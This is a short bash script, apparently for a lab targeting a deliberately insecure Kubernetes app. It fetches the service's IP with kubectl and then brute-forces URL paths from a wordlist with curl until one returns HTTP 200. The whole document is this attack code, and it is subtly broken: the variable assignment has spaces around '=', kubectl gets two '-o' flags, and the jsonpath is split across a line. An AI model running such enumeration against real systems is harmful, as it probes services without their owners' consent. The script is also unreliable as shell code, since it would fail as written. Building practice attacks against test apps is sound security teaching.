#!/bin/bash
# Get the address of the service we are attacking
SERVICE_IP = $(kubectl get svc insecure-app -n insecureapp -o table -o jsonpath='{.status.loadBalancer.ingress[0
].ip}')

# Dictionary attack the service
echo "Dictionary attack on $SERVICE_IP"
while read -r line; do
    echo "Trying $line"
    curl -s -o /dev/null -w "%{http_code}" "http://$SERVICE_IP/$line" | grep -q "200"
    if [ $? -eq 0 ]; then
        echo "Found url: http://$SERVICE_IP/$line"
        break
    fi
done < dictionary.txt